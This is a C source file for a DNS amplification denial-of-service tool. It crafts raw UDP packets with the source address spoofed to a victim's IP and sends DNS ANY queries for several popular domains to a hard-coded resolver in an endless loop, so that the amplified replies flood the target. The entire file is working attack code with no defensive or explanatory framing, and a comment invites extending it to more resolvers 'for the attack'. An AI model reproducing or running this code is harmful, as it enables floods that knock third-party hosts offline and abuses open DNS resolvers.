#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <time.h>
#include "chungdns.h"

void usage(char *str);
void error(char *str);
void dns_send(char *trgt_ip, int trgt_p, char *dns_srv, int dns_p, char *dns_record);

int CHUNGDNS(int argc, char **argv)
{
   // Initial uid check and argument count check
   if(argc<4)
      usage(argv[1]);

   // Assignments to variables from the given arguments
   char *trgt_ip = argv[2];
   int trgt_p = atoi(argv[3]);

   // This code is just an example if you want to use a list of records
   // to resolve for the attack, or use a list of different DNS servers, etc
   //while(1)
      //dns_send(trgt_ip, trgt_p, dns_srv, 53, dns_rcrd);
   while(1) {
      dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "www.google.com");
      dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "ietf.org");
      dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "www.amazon.com");
      dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "ieee.org");
   }
   return 0;
}

void usage(char *str)
{
   printf("%s\n target port\n", str);
   exit(0);
}

void error(char *str)
{
    printf("%s\n",str);
}

short csum( short *ptr,int nbytes)
{
   register long sum;
   short oddbyte;
   register short answer;

   sum=0;
   while(nbytes>1) {
      sum+=*ptr++;
      nbytes-=2;
   }
   if(nbytes==1) {
      oddbyte=0;
      *(( char *)&oddbyte)=*( char *)ptr;
      sum+=oddbyte;
   }

   sum = (sum>>16)+(sum & 0xffff);
   sum = sum + (sum>>16);
   answer=(short)~sum;

   return(answer);
}

// Taken from http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
void dns_format(char * dns,char * host)
{
   int lock = 0 , i;
   strcat((char*)host,".");
   for(i = 0 ; i < strlen((char*)host) ; i++)
   {
      if(host[i]=='.')
      {
         *dns++ = i-lock;
         for(;lock<i;lock++)
         {
            *dns++=host[lock];
         }
         lock++;
      }
   }
   *dns++=0x00;
}

// Creates the dns header and packet
void dns_hdr_create(dns_hdr *dns)
{
   dns->id = (short) htons(getpid());
   dns->flags = htons(0x0100);
   dns->qcount = htons(1);
   dns->ans = 0;
   dns->auth = 0;
   dns->add = 0;
}

void dns_send(char *trgt_ip, int trgt_p, char *dns_srv, int dns_p, char *dns_record)
{
   // Building the DNS request data packet

   char dns_data[128];

   dns_hdr *dns = (dns_hdr *)&dns_data;
   dns_hdr_create(dns);

   char *dns_name, dns_rcrd[32];
   dns_name = ( char *)&dns_data[sizeof(dns_hdr)];
   strcpy(dns_rcrd, dns_record);
   dns_format(dns_name , dns_rcrd);

   query *q;
   q = (query *)&dns_data[sizeof(dns_hdr) + (strlen(dns_name)+1)];
   q->qtype = htons(0x00ff);
   q->qclass = htons(0x1);


   // Building the IP and UDP headers
   char datagram[4096], *data, *psgram;
    memset(datagram, 0, 4096);

   data = datagram + sizeof(iph) + sizeof(udph);
    memcpy(data, &dns_data, sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query) +1);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dns_p);
    sin.sin_addr.s_addr = inet_addr(dns_srv);

    iph *ip = (iph *)datagram;
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query);
    ip->id = htonl(getpid());
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(trgt_ip);
    ip->daddr = sin.sin_addr.s_addr;
   ip->check = csum((short *)datagram, ip->tot_len);

    udph *udp = (udph *)(datagram + sizeof(iph));
   udp->source = htons(trgt_p);
    udp->dest = htons(dns_p);
    udp->len = htons(8+sizeof(dns_hdr)+(strlen(dns_name)+1)+sizeof(query));
    udp->check = 0;

   // Pseudoheader creation and checksum calculation
   ps_hdr pshdr;
   pshdr.saddr = inet_addr(trgt_ip);
    pshdr.daddr = sin.sin_addr.s_addr;
    pshdr.filler = 0;
    pshdr.protocol = IPPROTO_UDP;
    pshdr.len = htons(sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query));

   int pssize = sizeof(ps_hdr) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query);
    psgram =(char *) malloc(pssize);

    memcpy(psgram, (char *)&pshdr, sizeof(ps_hdr));
    memcpy(psgram + sizeof(ps_hdr), udp, sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query));

    udp->check = csum(( short *)psgram, pssize);

    // Send data
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sd==-1) error("Could not create socket.");
    else sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));

   free(psgram);
   close(sd);

   return;
}
